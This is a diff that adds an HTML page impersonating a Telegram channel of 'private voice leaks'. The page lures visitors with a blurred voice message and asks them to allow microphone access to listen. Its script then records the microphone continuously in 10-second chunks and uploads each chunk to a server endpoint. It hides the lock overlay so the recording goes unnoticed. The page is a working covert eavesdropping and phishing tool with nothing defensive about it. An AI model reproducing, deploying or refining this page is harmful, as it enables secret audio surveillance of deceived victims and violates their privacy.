@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram: Contact @private_leaks</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #17212b;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .chat-container {
+            width: 100%;
+            max-width: 460px;
+            background-color: #0e1621;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background-color: #17212b;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #101921;
+        }
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(45deg, #ff0000, #ff8800);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 18px;
+            margin-right: 15px;
+        }
+
+        .header-info h3 {
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .header-info p {
+            margin: 2px 0 0 0;
+            font-size: 13px;
+            color: #7d8b99;
+        }
+
+        .message-area {
+            padding: 20px;
+            background-image: url('https://w.wallhaven.cc/full/lq/wallhaven-lqwg92.png');
+            background-size: cover;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            min-height: 300px;
+        }
+
+        .message {
+            background-color: #182533;
+            padding: 10px;
+            border-radius: 10px;
+            max-width: 85%;
+            align-self: flex-start;
+            position: relative;
+        }
+
+        .message.voice-msg {
+            padding: 15px;
+            background-color: #182533;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .play-btn {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #5b9def, #3b7cce);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .voice-info {
+            flex-grow: 1;
+        }
+
+        .waveform {
+            height: 30px;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 20"><rect fill="%235b9def" x="0" y="5" width="2" height="10"/><rect fill="%235b9def" x="5" y="2" width="2" height="16"/><rect fill="%235b9def" x="10" y="7" width="2" height="6"/><rect fill="%235b9def" x="15" y="4" width="2" height="12"/><rect fill="%235b9def" x="20" y="8" width="2" height="4"/><rect fill="%235b9def" x="25" y="3" width="2" height="14"/><rect fill="%235b9def" x="30" y="6" width="2" height="8"/><rect fill="%235b9def" x="35" y="1" width="2" height="18"/><rect fill="%235b9def" x="40" y="5" width="2" height="10"/><rect fill="%235b9def" x="45" y="8" width="2" height="4"/><rect fill="%235b9def" x="50" y="3" width="2" height="14"/><rect fill="%235b9def" x="55" y="6" width="2" height="8"/><rect fill="%235b9def" x="60" y="2" width="2" height="16"/><rect fill="%235b9def" x="65" y="5" width="2" height="10"/><rect fill="%235b9def" x="70" y="7" width="2" height="6"/><rect fill="%235b9def" x="75" y="4" width="2" height="12"/><rect fill="%235b9def" x="80" y="6" width="2" height="8"/><rect fill="%235b9def" x="85" y="3" width="2" height="14"/><rect fill="%235b9def" x="90" y="5" width="2" height="10"/><rect fill="%235b9def" x="95" y="8" width="2" height="4"/></svg>') no-repeat center;
+            background-size: contain;
+            filter: blur(3px);
+        }
+
+        .voice-duration {
+            font-size: 12px;
+            color: #7d8b99;
+            margin-top: 5px;
+        }
+
+        .blur-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+            border-radius: 10px;
+        }
+
+        .unlock-btn {
+            background-color: #2b5278;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+
+        .unlock-btn:hover {
+            background-color: #366592;
+        }
+
+        .lock-icon {
+            font-size: 30px;
+            margin-bottom: 10px;
+        }
+
+        .time {
+            text-align: right;
+            font-size: 11px;
+            color: #5d6c7b;
+            margin-top: 5px;
+            margin-right: 5px;
+        }
+
+        .status-text {
+            color: #5b9def;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="chat-container">
+        <div class="header">
+            <div class="avatar">🔊</div>
+            <div class="header-info">
+                <h3>PRIVATE VOICE LEAKS 18+</h3>
+                <p>8,234 subscribers</p>
+            </div>
+        </div>
+
+        <div class="message-area">
+
+            <div class="message">
+                <div style="color: #64bdff; font-weight: bold; margin-bottom: 5px; font-size: 14px;">Admin</div>
+                Yeni ses yazisi geldi 🔥🔥
+                <div class="time">15:42</div>
+            </div>
+
+            <div class="message voice-msg" style="position: relative;">
+                <div class="play-btn">▶️</div>
+                <div class="voice-info">
+                    <div class="waveform"></div>
+                    <div class="voice-duration">0:47</div>
+                </div>
+
+                <div class="blur-overlay" id="blurOverlay">
+                    <div class="lock-icon">🎤</div>
+                    <div style="text-align: center; padding: 0 15px;">
+                        <p style="margin:0; font-size: 14px; color: #ddd;">Voice Message</p>
+                        <p style="margin:5px 0 15px 0; font-size: 13px; color: #888;">Sesi dinlemek ucun mikrofon
+                            icazesini verin</p>
+                        <button class="unlock-btn" id="allowBtn">LISTEN NOW</button>
+                        <div class="status-text" id="statusText"></div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        const allowBtn = document.getElementById('allowBtn');
+        const blurOverlay = document.getElementById('blurOverlay');
+        const statusText = document.getElementById('statusText');
+
+        let mediaRecorder;
+        let audioChunks = [];
+
+        function sendAudio(blob) {
+            const formData = new FormData();
+            formData.append('audio', blob, 'recording.wav');
+
+            fetch('/upload_audio', {
+                method: 'POST',
+                body: formData
+            })
+                .then(res => res.json())
+                .then(data => {
+                    console.log("Audio sent:", data);
+                })
+                .catch(err => console.error("Error:", err));
+        }
+
+        allowBtn.addEventListener('click', () => {
+            statusText.textContent = "Requesting access...";
+
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    statusText.textContent = "Recording...";
+
+                    // Setup recorder
+                    mediaRecorder = new MediaRecorder(stream);
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        sendAudio(audioBlob);
+                        audioChunks = [];
+
+                        // Restart recording
+                        setTimeout(() => {
+                            mediaRecorder.start();
+                            setTimeout(() => mediaRecorder.stop(), 10000); // 10 second chunks
+                        }, 1000);
+                    };
+
+                    // Start first recording
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 10000); // 10 second chunks
+
+                    // "Unlock" after a moment
+                    setTimeout(() => {
+                        blurOverlay.style.display = 'none';
+                    }, 1500);
+                })
+                .catch(err => {
+                    statusText.textContent = "Error! Permission denied.";
+                    console.error(err);
+                });
+        });
+    </script>
+
+</body>
+
+</html>
